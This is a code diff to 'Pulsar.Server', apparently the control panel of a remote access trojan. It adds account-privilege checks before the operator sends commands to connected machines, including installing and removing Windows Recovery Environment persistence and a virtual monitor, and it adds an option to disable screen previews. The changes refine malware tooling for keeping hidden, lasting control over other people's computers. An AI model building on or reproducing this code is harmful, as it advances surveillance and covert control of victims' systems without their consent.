@@ -220,7 +220,7 @@ namespace Pulsar.Server.Forms
                 lstClients.StretchColumnByIndex(accountTypeIndex);
             }
 
-            EventLog("Welcome to Pulsar Continuation.", "info");
+            EventLog("Welcome to Pulsar.", "info");
             InitializeServer();
             AutostartListening();
             EventLogVisability();
@@ -384,6 +384,11 @@ namespace Pulsar.Server.Forms
                     Quality = 20,
                     DisplayIndex = 0
                 };
+
+                if (chkDisablePreview.Checked)
+                {
+                    return;
+                }
 
                 selectedClients[0].Send(image);
             }
@@ -609,7 +614,12 @@ namespace Pulsar.Server.Forms
                         });
                         break;
                     case "WinRE":
-                        client.Send(new DoAddWinREPersistence { });
+                        if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
+                        {
+                            client.Send(new DoAddWinREPersistence());
+                        }
+                        break;
+                    default:
                         break;
                 }
             }
@@ -1113,7 +1123,16 @@ namespace Pulsar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoAddWinREPersistence());
+                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
+
+                if (isClientAdmin)
+                {
+                    c.Send(new DoAddWinREPersistence());
+                }
+                else
+                {
+                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
             }
         }
 
@@ -1121,7 +1140,16 @@ namespace Pulsar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoRemoveWinREPersistence());
+                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
+
+                if (isClientAdmin)
+                {
+                    c.Send(new DoRemoveWinREPersistence());
+                }
+                else
+                {
+                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
             }
         }
 
@@ -1392,7 +1420,7 @@ namespace Pulsar.Server.Forms
             }
         }
 
-        private void installVirtualMonitorToolStripMenuItem_Click(object sender, EventArgs e)
+        private void installVirtualMonitorToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
             {
@@ -1401,6 +1429,23 @@ namespace Pulsar.Server.Forms
                 if (isClientAdmin)
                 {
                     c.Send(new DoInstallVirtualMonitor());
+                }
+                else
+                {
+                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
+        private void uninstallVirtualMonitorToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                //check if client is admin
+                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
+                if (isClientAdmin)
+                {
+                    c.Send(new DoUninstallVirtualMonitor());
                 }
                 else
                 {
